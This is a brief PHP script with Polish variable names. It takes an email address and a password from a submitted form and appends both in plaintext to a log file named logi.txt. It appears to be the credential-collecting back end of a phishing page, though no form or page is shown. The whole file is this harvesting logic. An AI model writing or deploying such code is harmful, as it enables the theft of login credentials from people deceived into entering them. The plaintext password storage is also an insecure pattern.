<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$tekst = "E-mail: $email Hasło: $pass \r\n";

$uchwyt = fopen("logi.txt", "a");
fwrite($uchwyt, $tekst);
fclose($uchwyt);

?>